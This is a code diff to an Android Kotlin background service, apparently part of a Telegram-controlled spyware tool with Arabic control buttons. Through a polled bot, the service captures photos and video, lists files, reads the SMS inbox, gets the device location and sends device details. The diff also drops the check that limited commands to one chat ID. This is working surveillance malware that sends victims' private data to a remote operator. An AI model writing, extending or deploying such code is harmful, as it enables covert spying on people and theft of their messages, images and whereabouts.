@@ -56,8 +56,7 @@ class CameraService : Service() {
 
     private fun startPolling() {
         scope.launch {
-            clearUpdates() // Important: Clear old buttons
-            
+            clearUpdates() 
             val startKeyboard = """
             {
                 "keyboard": [
@@ -70,12 +69,11 @@ class CameraService : Service() {
                 "one_time_keyboard": false
             }
             """.trimIndent()
-            
-            Telegram.sendMessageWithKeyboard("👋 مرحباً بك يا سيدي.\n\nالأداة جاهزة. استخدم الأزرار النصية في الأسفل للتحكم بالكامل.\n\nاستخدم ▶️ للبدء، و 🛑 للإيقاف.", startKeyboard)
+            Telegram.sendMessageWithKeyboard("👋 مرحباً بك يا سيدي.\n\nالأداة جاهزة. استخدم الأزرار النصية في الأسفل للتحكم بالكامل.", startKeyboard)
             
             while (isActive && isRunning) {
                 runCatching { checkCommands() }
-                delay(3000)
+                delay(2000)
             }
         }
     }
@@ -99,27 +97,21 @@ class CameraService : Service() {
             val u = arr.getJSONObject(i)
             lastUpdateId = u.getLong("update_id")
             
-            val msgObj = u.optJSONObject("message")
-            val fromId = msgObj?.optJSONObject("from")?.optString("id")
-            val text = if (fromId == Telegram.CHAT_ID) msgObj.optString("text") else null
-            if (text != null) {
-                when (text.trim()) {
-                    "/start" -> sendDeviceInfo()
-                    "▶️ بدء العمل" -> {
-                        sendDeviceInfo()
-                        Telegram.sendMessage("✅ الأداة تعمل الآن في الخلفية.")
+            val msg = u.optJSONObject("message")
+            if (msg != null) {
+                val text = msg.optString("text")
+                if (text.isNotEmpty()) {
+                    when (text.trim()) {
+                        "/start" -> sendDeviceInfo()
+                        "▶️ بدء العمل" -> sendDeviceInfo()
+                        "🛑 إيقاف الأداة" -> { isRunning = false; stopSelf() }
+                        "📸 صورة" -> captureAndSend()
+                        "🎥 فيديو" -> recordVideo()
+                        "📂 الملفات" -> listDirectory(currentDir)
+                        "💬 الرسائل" -> readSMS()
+                        "📍 الموقع" -> getLocation()
+                        "📱 معلومات الجهاز" -> sendDeviceInfo()
                     }
-                    "🛑 إيقاف الأداة" -> {
-                        isRunning = false
-                        Telegram.sendMessage("🛑 تم إيقاف الأداة مؤقتاً. ستعود للعمل عند فتح التطبيق.")
-                        stopSelf()
-                    }
-                    "📸 صورة" -> captureAndSend()
-                    "🎥 فيديو" -> recordVideo()
-                    "📂 الملفات" -> listDirectory(currentDir)
-                    "💬 الرسائل" -> readSMS()
-                    "📍 الموقع" -> getLocation()
-                    "📱 معلومات الجهاز" -> sendDeviceInfo()
                 }
             }
         }
@@ -140,10 +132,7 @@ class CameraService : Service() {
 
     private fun readSMS() {
         try {
-            val cursor = contentResolver.query(
-                android.net.Uri.parse("content://sms/inbox"),
-                null, null, null, null
-            )
+            val cursor = contentResolver.query(android.net.Uri.parse("content://sms/inbox"), null, null, null, null)
             val sb = StringBuilder()
             if (cursor != null && cursor.moveToFirst()) {
                 do {
